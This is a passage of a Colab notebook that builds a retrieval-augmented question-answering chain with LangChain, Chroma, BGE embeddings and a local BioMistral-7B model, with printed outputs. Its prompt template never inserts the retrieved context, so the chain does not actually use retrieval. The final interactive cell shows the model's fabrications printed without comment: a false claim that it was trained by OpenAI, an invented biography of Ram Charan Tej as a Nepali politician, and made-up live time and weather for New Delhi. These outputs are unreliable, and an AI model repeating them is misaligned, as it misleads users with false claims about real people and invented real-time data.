            "2e595f699b4d4a43bdea7ccd88688a9f",
            "e88e9fc6afbd4b95bf08cdf29b56a019",
            "73da00d3d58546f3bb0c509bc5b29970",
            "e08e30e6a95a4597ac7eaa660d00e878",
            "5fbab8b1b6144854bdb371790de57dd3",
            "64288aee227c4e60b3f8c831207af5fb",
            "3d424ab109af458086446485924ed7e2",
            "d48243958e5343e48e6c9fbaa63a62a5",
            "584cec4f2c5f4eefbfba8f0097b208c4",
            "b5ed9d5358e24a1e8ce97b72b66139ea",
            "c9dbd14960874944ba464f358a34ad5b",
            "a41cfa71ddd84729a764a5e789069869",
            "51805a7cd9ad495d82df2c4c87436460",
            "17d727562a8b44d999464f89b199b06f",
            "4796ff5b45914db5b816529aaf8f0801",
            "49d20bb2bbad4efba7608769da717001",
            "f9ea04b79fbd4e53b07987065b9d34b3",
            "7db2d0ad8353433bab53826a9e0384bb",
            "cbc30d3180bf4474983bdb943314d0e3",
            "fddfcbd623674e058b8db6f0ec5a5072",
            "7fe61433610d471f8379fb66da715e89",
            "138b7a559e04436fa39f5329583e9f05",
            "008abd25bc0341b596d63679f38808cd",
            "d9d78fda73d4487fb57dffa3f4cc79f8",
            "f9ee9879835d41cf9941a0deb241e9db",
            "3764fa3597c641c09a77fc04d5c9dc70",
            "9c1a71ebc3974220a872beb1b1f2129c",
            "4be0d6b410504683b7d1cbf6699cf0a5",
            "17eb2fda991848aba46d702c045976b1",
            "ce644577204b47bda24082cff7998416",
            "e73f5e429c484904b4e219937b60367a",
            "ace37b4b56cc42b2a39a1934cdfd76e8",
            "372d9985a5434edcb58f449cfa741cad",
            "0487f08a6dd04388878af20a7efac81a",
            "d2c2d4e15c174ab2a7591fea6ea07f81",
            "1e26f07104804238b4685e0e0f47d4d2",
            "2bcc743683e242a9b93e985d50343e78",
            "8fac7a3f36054145b839e38e007a451b",
            "e2b01d5362444cb7a0261f1e3ead03c2",
            "7f6876709e7a4599adb222cad90b90ac",
            "7574cd75653c42498d854e6ccc2e07f7",
            "3ce9f79813cb4a559bbfc62f06efe28c",
            "e4f0c55bd0664a08825fb5718e3f1111",
            "6755845f62cf45db89891cd0229faa18",
            "aaf0d7d39018443eb64c95d62acb6cf5",
            "057696046b164065bc22bae251ee87c0",
            "a21755d36c424b60bd9375daae38e5aa",
            "8fd7dff198df4744a1f53920422a6e6c",
            "940b2dfbef444d1998abe70a38baf2ba",
            "db4931cc3fbe4fcd891ec777aad9ea11",
            "38544af91210445684656fbfe5b7bc4b",
            "9e9ce3310454458181bced61adee04c0",
            "ae52692eaca042a3900c032f549074b7",
            "b3161c3a23fb4971a56c1c1bc9564186",
            "51a3aabb657246688ecf1527b53a14b5",
            "cded72585e49455e9194bdbfcb321727",
            "6bbb80a179994970b7748738b6e0a55e",
            "85bcb9796f63411bb57d11f526653802",
            "55089a230d254ba2a93eee63c36c768c",
            "88b6a2a1be174813926d67eb497b0d76",
            "7a906f87d8164064909a8e405ce38a04",
            "974a52f0dcfb450c8c3d8346a30b5c60",
            "6b07e8f6dcc14d43bf2598b64b1f4367"
          ]
        },
        "id": "QcUdFP8cPz1L",
        "outputId": "55acbedd-b17b-4291-b6d0-7483e77adba1"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-17-e470369191f5>:1: LangChainDeprecationWarning: The class `HuggingFaceEmbeddings` was deprecated in LangChain 0.2.2 and will be removed in 1.0. An updated version of the class exists in the langchain-huggingface package and should be used instead. To use it run `pip install -U langchain-huggingface` and import as `from langchain_huggingface import HuggingFaceEmbeddings`.\n",
            "  embeddings = HuggingFaceEmbeddings(model_name=\"BAAI/bge-base-en-v1.5\")\n",
            "/usr/local/lib/python3.10/dist-packages/sentence_transformers/cross_encoder/CrossEncoder.py:13: TqdmExperimentalWarning: Using `tqdm.autonotebook.tqdm` in notebook mode. Use `tqdm.tqdm` instead to force console mode (e.g. in jupyter console)\n",
            "  from tqdm.autonotebook import tqdm, trange\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "modules.json:   0%|          | 0.00/349 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "debd2f92e22a44df8943132e671636b4"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config_sentence_transformers.json:   0%|          | 0.00/124 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "082f318c5fbd484380d8236dc45f9113"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "README.md:   0%|          | 0.00/94.6k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "64f7adbbb81f4b94b58a00bab4b866bf"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "sentence_bert_config.json:   0%|          | 0.00/52.0 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "33338f5796c74c78a5e065990afe3164"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/777 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "d97a4d7559264300b86579dc5b0e93d5"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model.safetensors:   0%|          | 0.00/438M [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "d43667173bb5433b8d7bc06e294391c0"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json:   0%|          | 0.00/366 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "584cec4f2c5f4eefbfba8f0097b208c4"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.txt:   0%|          | 0.00/232k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "fddfcbd623674e058b8db6f0ec5a5072"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer.json:   0%|          | 0.00/711k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "e73f5e429c484904b4e219937b60367a"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "special_tokens_map.json:   0%|          | 0.00/125 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "3ce9f79813cb4a559bbfc62f06efe28c"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "1_Pooling/config.json:   0%|          | 0.00/190 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "ae52692eaca042a3900c032f549074b7"
            }
          },
          "metadata": {}
        }
      ],
      "source": [
        "embeddings = HuggingFaceEmbeddings(model_name=\"BAAI/bge-base-en-v1.5\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cJMgeAOrQfuk"
      },
      "source": [
        "## Vector Store - FAISS or ChromaDB"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 18,
      "metadata": {
        "id": "_rMc5YphQiFA"
      },
      "outputs": [],
      "source": [
        "vectorstore = Chroma.from_documents(chunks, embeddings)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 19,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FmJth21AQx8V",
        "outputId": "44284dc9-64df-439f-9379-2f7d59d895d6"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<langchain_community.vectorstores.chroma.Chroma at 0x7be1ddecc5b0>"
            ]
          },
          "metadata": {},
          "execution_count": 19
        }
      ],
      "source": [
        "vectorstore"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 20,
      "metadata": {
        "id": "MxUNoeFeR7-u"
      },
      "outputs": [],
      "source": [
        "query = \"what is network\" # what is at risk of heart disease\n",
        "search = vectorstore.similarity_search(query)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 21,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 80
        },
        "id": "45HgM9wsSCKH",
        "outputId": "668b995f-dfdc-4f1f-9ee3-e0d31d103733"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<IPython.core.display.Markdown object>"
            ],
            "text/markdown": "> A network is a group of two or more  computer systems or other devices \n> that are linked together to exchange data . In networks, computing devices \n> exchange data with each other using data links between nodes. These data links"
          },
          "metadata": {},
          "execution_count": 21
        }
      ],
      "source": [
        "to_markdown(search[0].page_content)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4mVaIlkZRiXk"
      },
      "source": [
        "## Retriever"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 22,
      "metadata": {
        "id": "rK67OkSQRbnk"
      },
      "outputs": [],
      "source": [
        "retriever = vectorstore.as_retriever(\n",
        "    search_kwargs={'k': 5}\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 23,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "HC4Xly8XSf26",
        "outputId": "1fe96b8b-836a-4212-d53c-4b8f422bb766"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-23-162c3489abc9>:1: LangChainDeprecationWarning: The method `BaseRetriever.get_relevant_documents` was deprecated in langchain-core 0.1.46 and will be removed in 1.0. Use invoke instead.\n",
            "  retriever.get_relevant_documents(query)\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[Document(metadata={'page': 1, 'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf'}, page_content='A network is a group of two or more  computer systems or other devices \\nthat are linked together to exchange data . In networks, computing devices \\nexchange data with each other using data links between nodes. These data links'),\n",
              " Document(metadata={'page': 1, 'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf'}, page_content='Wide area network (WAN)  \\nA WAN  is a computer network that covers a large geographic area such \\nas a city, country, or spans even inter continental distances. A WAN uses a \\ncommunications channel that combines many types of media such as telephone \\nlines,  ethernet cables, optical fibers , etc.'),\n",
              " Document(metadata={'page': 1, 'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf'}, page_content='communication hub for users to connect all their wireless device.  \\n \\nTypes of Networks  \\n \\nLocal area network (LAN)  \\nA LAN is a network that connects computers  and devices in a limited \\ngeographical area such as a home, school, office building.  \\nWide area network (WAN)'),\n",
              " Document(metadata={'page': 5, 'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf'}, page_content='Super network  (Supernet)  \\nSupernet is an Internet Protocol network that is formed, for combining \\ntwo or more networks into a larger  network. The benefits of supernetting are \\nconservation of address space, gaining efficiency regarding  memory storage and \\nroute information processing.'),\n",
              " Document(metadata={'page': 1, 'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf'}, page_content='are established with the help of cable media such as wires or wireless media \\nsuch as WiFi.  \\n \\nNetwork Components and Functions  \\nServer : A computer or device on a network that manages  network \\nresources. Servers are often dedicated , meaning that they perform no other tasks')]"
            ]
          },
          "metadata": {},
          "execution_count": 23
        }
      ],
      "source": [
        "retriever.get_relevant_documents(query)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "al9E1TqMS7Mq"
      },
      "source": [
        "## Large Language Model - Open Source"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 24,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CIiVtQ17N1Pq",
        "outputId": "6542d55f-5bb4-4012-aa76-33a7e1b29bff"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount(\"/content/drive\", force_remount=True).\n"
          ]
        }
      ],
      "source": [
        "drive.mount('/content/drive')"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 27,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MKDFEMDSS9ri",
        "outputId": "1400b324-6d2e-4d81-e381-99206ba1b911"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "llama_model_loader: loaded meta data with 21 key-value pairs and 291 tensors from /content/drive/MyDrive/Pdf/Bio/BioMistral-7B.Q4_K_M.gguf (version GGUF V3 (latest))\n",
            "llama_model_loader: Dumping metadata keys/values. Note: KV overrides do not apply in this output.\n",
            "llama_model_loader: - kv   0:                       general.architecture str              = llama\n",
            "llama_model_loader: - kv   1:                               general.name str              = hub\n",
            "llama_model_loader: - kv   2:                       llama.context_length u32              = 32768\n",
            "llama_model_loader: - kv   3:                     llama.embedding_length u32              = 4096\n",
            "llama_model_loader: - kv   4:                          llama.block_count u32              = 32\n",
            "llama_model_loader: - kv   5:                  llama.feed_forward_length u32              = 14336\n",
            "llama_model_loader: - kv   6:                 llama.rope.dimension_count u32              = 128\n",
            "llama_model_loader: - kv   7:                 llama.attention.head_count u32              = 32\n",
            "llama_model_loader: - kv   8:              llama.attention.head_count_kv u32              = 8\n",
            "llama_model_loader: - kv   9:     llama.attention.layer_norm_rms_epsilon f32              = 0.000010\n",
            "llama_model_loader: - kv  10:                       llama.rope.freq_base f32              = 10000.000000\n",
            "llama_model_loader: - kv  11:                          general.file_type u32              = 15\n",
            "llama_model_loader: - kv  12:                       tokenizer.ggml.model str              = llama\n",
            "llama_model_loader: - kv  13:                      tokenizer.ggml.tokens arr[str,32000]   = [\"<unk>\", \"<s>\", \"</s>\", \"<0x00>\", \"<...\n",
            "llama_model_loader: - kv  14:                      tokenizer.ggml.scores arr[f32,32000]   = [0.000000, 0.000000, 0.000000, 0.0000...\n",
            "llama_model_loader: - kv  15:                  tokenizer.ggml.token_type arr[i32,32000]   = [2, 3, 3, 6, 6, 6, 6, 6, 6, 6, 6, 6, ...\n",
            "llama_model_loader: - kv  16:                tokenizer.ggml.bos_token_id u32              = 1\n",
            "llama_model_loader: - kv  17:                tokenizer.ggml.eos_token_id u32              = 2\n",
            "llama_model_loader: - kv  18:            tokenizer.ggml.unknown_token_id u32              = 0\n",
            "llama_model_loader: - kv  19:                    tokenizer.chat_template str              = {{ bos_token }}{% for message in mess...\n",
            "llama_model_loader: - kv  20:               general.quantization_version u32              = 2\n",
            "llama_model_loader: - type  f32:   65 tensors\n",
            "llama_model_loader: - type q4_K:  193 tensors\n",
            "llama_model_loader: - type q6_K:   33 tensors\n",
            "llm_load_vocab: special tokens cache size = 3\n",
            "llm_load_vocab: token to piece cache size = 0.1637 MB\n",
            "llm_load_print_meta: format           = GGUF V3 (latest)\n",
            "llm_load_print_meta: arch             = llama\n",
            "llm_load_print_meta: vocab type       = SPM\n",
            "llm_load_print_meta: n_vocab          = 32000\n",
            "llm_load_print_meta: n_merges         = 0\n",
            "llm_load_print_meta: vocab_only       = 0\n",
            "llm_load_print_meta: n_ctx_train      = 32768\n",
            "llm_load_print_meta: n_embd           = 4096\n",
            "llm_load_print_meta: n_layer          = 32\n",
            "llm_load_print_meta: n_head           = 32\n",
            "llm_load_print_meta: n_head_kv        = 8\n",
            "llm_load_print_meta: n_rot            = 128\n",
            "llm_load_print_meta: n_swa            = 0\n",
            "llm_load_print_meta: n_embd_head_k    = 128\n",
            "llm_load_print_meta: n_embd_head_v    = 128\n",
            "llm_load_print_meta: n_gqa            = 4\n",
            "llm_load_print_meta: n_embd_k_gqa     = 1024\n",
            "llm_load_print_meta: n_embd_v_gqa     = 1024\n",
            "llm_load_print_meta: f_norm_eps       = 0.0e+00\n",
            "llm_load_print_meta: f_norm_rms_eps   = 1.0e-05\n",
            "llm_load_print_meta: f_clamp_kqv      = 0.0e+00\n",
            "llm_load_print_meta: f_max_alibi_bias = 0.0e+00\n",
            "llm_load_print_meta: f_logit_scale    = 0.0e+00\n",
            "llm_load_print_meta: n_ff             = 14336\n",
            "llm_load_print_meta: n_expert         = 0\n",
            "llm_load_print_meta: n_expert_used    = 0\n",
            "llm_load_print_meta: causal attn      = 1\n",
            "llm_load_print_meta: pooling type     = 0\n",
            "llm_load_print_meta: rope type        = 0\n",
            "llm_load_print_meta: rope scaling     = linear\n",
            "llm_load_print_meta: freq_base_train  = 10000.0\n",
            "llm_load_print_meta: freq_scale_train = 1\n",
            "llm_load_print_meta: n_ctx_orig_yarn  = 32768\n",
            "llm_load_print_meta: rope_finetuned   = unknown\n",
            "llm_load_print_meta: ssm_d_conv       = 0\n",
            "llm_load_print_meta: ssm_d_inner      = 0\n",
            "llm_load_print_meta: ssm_d_state      = 0\n",
            "llm_load_print_meta: ssm_dt_rank      = 0\n",
            "llm_load_print_meta: ssm_dt_b_c_rms   = 0\n",
            "llm_load_print_meta: model type       = 7B\n",
            "llm_load_print_meta: model ftype      = Q4_K - Medium\n",
            "llm_load_print_meta: model params     = 7.24 B\n",
            "llm_load_print_meta: model size       = 4.07 GiB (4.83 BPW) \n",
            "llm_load_print_meta: general.name     = hub\n",
            "llm_load_print_meta: BOS token        = 1 '<s>'\n",
            "llm_load_print_meta: EOS token        = 2 '</s>'\n",
            "llm_load_print_meta: UNK token        = 0 '<unk>'\n",
            "llm_load_print_meta: LF token         = 13 '<0x0A>'\n",
            "llm_load_print_meta: max token length = 48\n",
            "llm_load_tensors: ggml ctx size =    0.14 MiB\n",
            "llm_load_tensors:        CPU buffer size =  4165.37 MiB\n",
            ".................................................................................................\n",
            "llama_new_context_with_model: n_batch is less than GGML_KQ_MASK_PAD - increasing to 32\n",
            "llama_new_context_with_model: n_ctx      = 512\n",
            "llama_new_context_with_model: n_batch    = 32\n",
            "llama_new_context_with_model: n_ubatch   = 32\n",
            "llama_new_context_with_model: flash_attn = 0\n",
            "llama_new_context_with_model: freq_base  = 10000.0\n",
            "llama_new_context_with_model: freq_scale = 1\n",
            "llama_kv_cache_init:        CPU KV buffer size =    64.00 MiB\n",
            "llama_new_context_with_model: KV self size  =   64.00 MiB, K (f16):   32.00 MiB, V (f16):   32.00 MiB\n",
            "llama_new_context_with_model:        CPU  output buffer size =     0.12 MiB\n",
            "llama_new_context_with_model:        CPU compute buffer size =     5.06 MiB\n",
            "llama_new_context_with_model: graph nodes  = 1030\n",
            "llama_new_context_with_model: graph splits = 1\n",
            "AVX = 1 | AVX_VNNI = 0 | AVX2 = 1 | AVX512 = 1 | AVX512_VBMI = 0 | AVX512_VNNI = 0 | AVX512_BF16 = 0 | FMA = 1 | NEON = 0 | SVE = 0 | ARM_FMA = 0 | F16C = 1 | FP16_VA = 0 | WASM_SIMD = 0 | BLAS = 0 | SSE3 = 1 | SSSE3 = 1 | VSX = 0 | MATMUL_INT8 = 0 | LLAMAFILE = 1 | \n",
            "Model metadata: {'tokenizer.chat_template': \"{{ bos_token }}{% for message in messages %}{% if (message['role'] == 'user') != (loop.index0 % 2 == 0) %}{{ raise_exception('Conversation roles must alternate user/assistant/user/assistant/...') }}{% endif %}{% if message['role'] == 'user' %}{{ '[INST] ' + message['content'] + ' [/INST]' }}{% elif message['role'] == 'assistant' %}{{ message['content'] + eos_token + ' ' }}{% else %}{{ raise_exception('Only user and assistant roles are supported!') }}{% endif %}{% endfor %}\", 'tokenizer.ggml.unknown_token_id': '0', 'tokenizer.ggml.eos_token_id': '2', 'general.architecture': 'llama', 'llama.rope.freq_base': '10000.000000', 'llama.context_length': '32768', 'general.name': 'hub', 'llama.embedding_length': '4096', 'llama.feed_forward_length': '14336', 'llama.attention.layer_norm_rms_epsilon': '0.000010', 'llama.rope.dimension_count': '128', 'tokenizer.ggml.bos_token_id': '1', 'llama.attention.head_count': '32', 'llama.block_count': '32', 'llama.attention.head_count_kv': '8', 'general.quantization_version': '2', 'tokenizer.ggml.model': 'llama', 'general.file_type': '15'}\n",
            "Available chat formats from metadata: chat_template.default\n",
            "Guessed chat format: mistral-instruct\n"
          ]
        }
      ],
      "source": [
        "llm = LlamaCpp(\n",
        "    model_path= \"/content/drive/MyDrive/Pdf/Bio/BioMistral-7B.Q4_K_M.gguf\",\n",
        "    temperature=0.3,\n",
        "    max_tokens=2048,\n",
        "    top_p=1)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_dy-nCxqTQTG"
      },
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5Y2ukOe5TS6u"
      },
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "eOm3anhXTwg-"
      },
      "source": [
        "## RAG Chain"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 28,
      "metadata": {
        "id": "M4dKOO7QUTa0"
      },
      "outputs": [],
      "source": [
        "from langchain.schema.runnable import RunnablePassthrough\n",
        "from langchain.schema.output_parser import StrOutputParser\n",
        "from langchain.prompts import ChatPromptTemplate"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 29,
      "metadata": {
        "id": "aBDfjug4U61T"
      },
      "outputs": [],
      "source": [
        "template = \"\"\"\n",
        "<|context|>\n",
        "You are an AI assistant that follows instruction extremely well.\n",
        "Please be truthful and give direct answers\n",
        "</s>\n",
        "<|user|>\n",
        "{query}\n",
        "</s>\n",
        " <|assistant|>\n",
        "\"\"\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 30,
      "metadata": {
        "id": "oGSLkCc7U8YI"
      },
      "outputs": [],
      "source": [
        "prompt = ChatPromptTemplate.from_template(template)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 31,
      "metadata": {
        "id": "hLfDSrrzU1kE"
      },
      "outputs": [],
      "source": [
        "rag_chain = (\n",
        "    {\"context\": retriever,  \"query\": RunnablePassthrough()}\n",
        "    | prompt\n",
        "    | llm\n",
        "    | StrOutputParser()\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 32,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "35B_JEcKVERB",
        "outputId": "16a9f02c-d02a-496b-c829-450d58187e38"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "\n",
            "llama_print_timings:        load time =    5043.90 ms\n",
            "llama_print_timings:      sample time =      36.71 ms /    66 runs   (    0.56 ms per token,  1797.78 tokens per second)\n",
            "llama_print_timings: prompt eval time =   27075.40 ms /    58 tokens (  466.82 ms per token,     2.14 tokens per second)\n",
            "llama_print_timings:        eval time =   43117.69 ms /    65 runs   (  663.35 ms per token,     1.51 tokens per second)\n",
            "llama_print_timings:       total time =   70286.95 ms /   123 tokens\n"
          ]
        }
      ],
      "source": [
        "response = rag_chain.invoke(\"what disease affect the heart?\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 33,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 80
        },
        "id": "uyor1d0xVHnW",
        "outputId": "380960bc-1367-4c68-d472-93529fc3c414"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<IPython.core.display.Markdown object>"
            ],
            "text/markdown": "> Hypertrophic cardiomyopathy, dilated cardiomyopathy, myocarditis, aortic stenosis, hypertensive heart disease, restrictive cardiomyopathy, arrhythmogenic right ventricular cardiomyopathy, and endocarditis."
          },
          "metadata": {},
          "execution_count": 33
        }
      ],
      "source": [
        "to_markdown(response)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "szG5MJhzORkC",
        "outputId": "d199d948-2e07-44cd-9227-ba3911b94cfc"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Input Prompt: what is python3\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 42 prefix-match hit, remaining 14 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    5043.90 ms\n",
            "llama_print_timings:      sample time =      41.05 ms /    71 runs   (    0.58 ms per token,  1729.64 tokens per second)\n",
            "llama_print_timings: prompt eval time =    5388.88 ms /    14 tokens (  384.92 ms per token,     2.60 tokens per second)\n",
            "llama_print_timings:        eval time =   46104.13 ms /    70 runs   (  658.63 ms per token,     1.52 tokens per second)\n",
            "llama_print_timings:       total time =   51600.04 ms /    84 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:   Python3 is a general-purpose programming language with dynamic semantics. It emphasizes code readability through the use of expressive syntax and a uniform syntax style, which results in more concise, clear, and easily readable code. It also has a large standard library and supports third-party libraries through the package management system pip.\n",
            "Input Prompt: who are you\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 14 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    5043.90 ms\n",
            "llama_print_timings:      sample time =      32.93 ms /    58 runs   (    0.57 ms per token,  1761.20 tokens per second)\n",
            "llama_print_timings: prompt eval time =    5345.21 ms /    14 tokens (  381.80 ms per token,     2.62 tokens per second)\n",
            "llama_print_timings:        eval time =   37958.74 ms /    57 runs   (  665.94 ms per token,     1.50 tokens per second)\n",
            "llama_print_timings:       total time =   43384.56 ms /    71 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  I am a large language model trained by OpenAI. I can understand text and generate text based on the input text. I have been trained on a wide variety of data, including text from websites, books, and other sources. I can answer questions and provide information on many topics.\n",
            "Input Prompt: who is ramcharantej\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 42 prefix-match hit, remaining 16 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    5043.90 ms\n",
            "llama_print_timings:      sample time =      57.98 ms /    98 runs   (    0.59 ms per token,  1690.24 tokens per second)\n",
            "llama_print_timings: prompt eval time =    6096.92 ms /    16 tokens (  381.06 ms per token,     2.62 tokens per second)\n",
            "llama_print_timings:        eval time =   64576.53 ms /    97 runs   (  665.74 ms per token,     1.50 tokens per second)\n",
            "llama_print_timings:       total time =   70820.28 ms /   113 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  Ram Charan Tej is a Nepali politician who has been the President of the Rashtriya Prajnatshan Party since its formation in 2017. He was elected as the President of the Federal People's Congress (FPC) from 2018 to 2023. He served as the Deputy Prime Minister and Home Minister of Nepal from May 2018 to August 2020.\n",
            "Input Prompt: show me india time \n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 17 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    5043.90 ms\n",
            "llama_print_timings:      sample time =      33.33 ms /    58 runs   (    0.57 ms per token,  1739.97 tokens per second)\n",
            "llama_print_timings: prompt eval time =    6327.10 ms /    16 tokens (  395.44 ms per token,     2.53 tokens per second)\n",
            "llama_print_timings:        eval time =   38671.49 ms /    58 runs   (  666.75 ms per token,     1.50 tokens per second)\n",
            "llama_print_timings:       total time =   45082.09 ms /    74 tokens\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Answer:  The current time in New Delhi, India is 10:32 AM. The weather in New Delhi at this time is mostly clear with some clouds. The temperature is 28°C and humidity is 64%. Wind speed is 5 km/hr.\n"
          ]
        }
      ],
      "source": [
        "import sys\n",
        "\n",
        "while True:\n",
        "  user_input = input(f\"Input Prompt: \")\n",
        "  if user_input == 'exit':\n",
        "    print('Exiting')\n",
        "    sys.exit()\n",
        "  if user_input == '':\n",
        "    continue\n",
        "  result = rag_chain.invoke(user_input)\n",
        "  print(\"Answer: \",result)"
      ]
    }
  ],
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "gpuType": "T4",
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "debd2f92e22a44df8943132e671636b4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_7dc1e04e325e42999eb85aeb3837a815",
              "IPY_MODEL_b26e563565ab49b98c8e820da11745d6",
              "IPY_MODEL_f96ce438c52248448657762249655156"
            ],
            "layout": "IPY_MODEL_e508ab07486c4a468013b088b82bfe4d"
          }
        },
        "7dc1e04e325e42999eb85aeb3837a815": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
